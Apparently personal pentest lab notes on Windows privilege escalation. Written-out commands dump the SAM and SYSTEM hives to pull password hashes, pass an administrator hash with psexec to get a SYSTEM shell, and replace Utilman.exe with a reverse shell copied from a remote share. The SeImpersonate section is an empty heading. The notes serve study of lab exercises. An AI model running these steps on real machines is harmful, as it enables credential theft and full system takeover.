- Rights of an account to perform specific tasks
- Can be checked with:
```powershell
whoami /priv 
```
- List of all permission can be found [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)

### SeBackup/SeRestore
- Allows users to read and write to any file or directory on the system, ignoring any permission of ACLs in place.
- Purpose of this privilege is to allow user to create a backup of the system without Admin of SYSTEM privs.
- Can be abused by creating a backup of the SYSTEM and SAM registry hive.
- SYSTEM and SAM hives can be backed up using : 
```powershell
# backup SYSTEM
reg save HKLM\SYSTEM C:\User\THMBackup\system.hive

# backup SAM
reg save HKLM\SAM C:\User\THMBackup\sam.hive
```
- These files can be used to extract hashes of users password using impacket's secretsdump [[Impacket#secretsdump.py]]
```bash
# Dump the local account hashes using system.hive and sam.hive
secretsdump.py -system system.hive -sam sam.hive LOCAL
```
- Administrator hashes can be used to perform pass the hash attack to gain system shell.
```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.112.124

# We get shell as system.
C:\Windows\System32>
```

### SeTakeOwnership
- This privilege can be use to take ownership of any object(files, registry keys) in the system.
- Can take ownership of an executables that runs with SYSTEM privs and get a system shell.
- `utilman.exe` is a service tha provides ease of access setting at windows login and runs with SYSTEM privileges.
- With `SeTakeOwnership` , we can take ownership of the `utilman.exe` executable and replace it with cmd or a reverse shell.
```powershell
# Take ownership of the utilman executable
takeown /f C:\Windows\System32\Utilman.exe

# Give yourself full permission to the executable
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F

# Overwrite the executable with reverse shell
copy \\<ip>\public\reverse Utilman.exe

# running a listener
nv -nvlp 9999
# After locking the computer and clicking on ease of access button, we get a reverse shell.
```

### SeImpersonate
